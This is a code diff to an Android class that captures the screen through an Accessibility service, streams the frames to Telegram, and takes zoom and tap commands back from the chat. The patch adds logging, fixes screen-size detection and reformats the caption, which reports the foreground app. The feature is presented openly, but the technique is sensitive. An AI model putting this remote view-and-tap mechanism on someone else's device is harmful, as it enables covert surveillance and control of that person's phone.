@@ -132,6 +132,7 @@ public final class LiveView {
     }
 
     public static void start(Context context) {
+        Log.i(TAG, "start() active=" + active);
         if (!active) {
             active = true;
             auto = false;
@@ -171,7 +172,21 @@ public final class LiveView {
         zoomStack.clear();
     }
 
+    /** True screen size, learned from the first captured bitmap. 0 until then. */
+    private static volatile int screenW = 0;
+    private static volatile int screenH = 0;
+
+    /**
+     * getDisplayMetrics() reports the app-usable area, which EXCLUDES the system bars -
+     * 720x1445 on this device against a real screen of 720x1600. Using it cropped the
+     * bottom ~10% out of every frame and squashed the grid into the wrong coordinate
+     * space, so taps landed above where they looked. takeScreenshot returns the whole
+     * display, so the captured bitmap is the authority; metrics are only the fallback
+     * before the first capture.
+     */
     private static Rect fullScreen() {
+        if (screenW > 0 && screenH > 0) return new Rect(0, 0, screenW, screenH);
+
         WatcherAccessibilityService s = WatcherAccessibilityService.current();
         int w = 1080, h = 2400;
         if (s != null) {
@@ -293,6 +308,7 @@ public final class LiveView {
     }
 
     private static void capture(Context context) {
+        Log.i(TAG, "capture() active=" + active);
         captureWithRetry(context, 0);
     }
 
@@ -303,7 +319,8 @@ public final class LiveView {
      * say so out loud if every attempt fails.
      */
     private static void captureWithRetry(Context context, int attempt) {
-        if (!active) return;
+        Log.i(TAG, "captureWithRetry attempt=" + attempt + " active=" + active);
+        if (!active) { Log.w(TAG, "capture aborted: session not active"); return; }
         WatcherAccessibilityService s = WatcherAccessibilityService.current();
         if (s == null) {
             TelegramNotifier.sendText(context, "⚠️ Live view needs the Accessibility service. Enable it and send /live again.", null);
@@ -359,6 +376,7 @@ public final class LiveView {
                 return;
             }
             if (full == null) {
+                Log.w(TAG, "captureBitmap returned null (attempt " + attempt + ")");
                 if (attempt + 1 < CAPTURE_ATTEMPTS) {
                     HANDLER.postDelayed(new RetryCapture(context, attempt + 1), CAPTURE_RETRY_MS);
                 } else {
@@ -368,6 +386,16 @@ public final class LiveView {
                 }
                 return;
             }
+            // The bitmap is the authority on screen size - see fullScreen(). If the
+            // view was built from the smaller metrics figure, widen it to the real
+            // screen so the bottom of the display is reachable.
+            if (full.getWidth() != screenW || full.getHeight() != screenH) {
+                boolean first = screenW == 0;
+                screenW = full.getWidth();
+                screenH = full.getHeight();
+                if (first && zoomStack.isEmpty()) resetView();
+            }
+            Log.i(TAG, "got bitmap " + full.getWidth() + "x" + full.getHeight() + ", rendering");
             RENDER.execute(new RenderTask(context, full));
         }
     }
@@ -413,6 +441,7 @@ public final class LiveView {
                 return;
             }
             frames++;
+            Log.i(TAG, "sending frame " + frames + " jpeg=" + jpeg.length + "B messageId=" + messageId);
             String cap = caption(context);
             String kb = keyboard();
             TelegramNotifier.sendOrEditFrame(context, messageId, jpeg, cap, kb,
@@ -426,7 +455,7 @@ public final class LiveView {
         Rect src = new Rect(
                 Math.max(0, r.left), Math.max(0, r.top),
                 Math.min(full.getWidth(), r.right), Math.min(full.getHeight(), r.bottom));
-        if (src.width() <= 0 || src.height() <= 0) return null;
+        if (src.width() <= 0 || src.height() <= 0) { Log.w(TAG, "render: empty crop src=" + src + " view=" + view); return null; }
 
         int outW = OUT_WIDTH;
         int outH = Math.max(1, (int) ((long) src.height() * outW / src.width()));
@@ -496,6 +525,7 @@ public final class LiveView {
         @Override
         public void onMessage(boolean ok, int id, String error) {
             if (ok) {
+                Log.i(TAG, "frame delivered, messageId=" + id);
                 consecutiveErrors = 0;
                 if (id > 0) messageId = id;
                 return;
@@ -578,19 +608,32 @@ public final class LiveView {
         Rect fs = fullScreen();
         boolean whole = r.width() >= fs.width() && r.height() >= fs.height();
 
+        // One fact per line. Telegram renders captions in a proportional font and wraps
+        // hard on a narrow column, so chains of "·" separators collapse into a wall of
+        // text that cannot be skimmed.
         StringBuilder sb = new StringBuilder();
-        sb.append("Numbers zoom into that box · ✥ TAP hits the red crosshair\n");
-        if (whole) {
-            sb.append("📐 whole screen ").append(r.width()).append("×").append(r.height());
-        } else {
-            sb.append("🔍 zoom ").append(r.width()).append("×").append(r.height())
-              .append("px at (").append(r.centerX()).append(",").append(r.centerY()).append(")");
-        }
-        sb.append("  ·  frame ").append(frames).append(auto ? "  ·  ▶ auto" : "  ·  ⏸ manual");
+
+        sb.append("🖥  LIVE VIEW  ·  frame ").append(frames)
+          .append(auto ? "  ·  ▶️ auto" : "  ·  ⏸ manual").append("\n\n");
+
         String fg = WatcherAccessibilityService.foregroundPackageName();
-        if (fg != null && fg.length() > 0) sb.append("\n📱 ").append(fg);
-        sb.append("  ·  🕒 ").append(new java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US)
-                .format(new java.util.Date()));
+        sb.append("📱 App      ").append(fg != null && fg.length() > 0 ? fg : "unknown").append("\n");
+        sb.append("👤 Profile  ").append(Prefs.currentProfile(context)).append("\n");
+        if (whole) {
+            sb.append("🔍 View     whole screen (").append(r.width()).append("×").append(r.height()).append(")\n");
+        } else {
+            sb.append("🔍 View     zoomed ").append(r.width()).append("×").append(r.height())
+              .append(" at (").append(r.centerX()).append(",").append(r.centerY()).append(")\n");
+        }
+        sb.append("🕒 Time     ")
+          .append(new java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(new java.util.Date()))
+          .append("\n\n");
+
+        sb.append("──────────────\n");
+        sb.append("1️⃣  Tap a number → zoom into that square\n");
+        sb.append("2️⃣  ✥ TAP → presses the red crosshair\n");
+        sb.append("3️⃣  🔍 Out → back a step   ·   ⛶ Whole → reset");
+
         return sb.toString();
     }
 
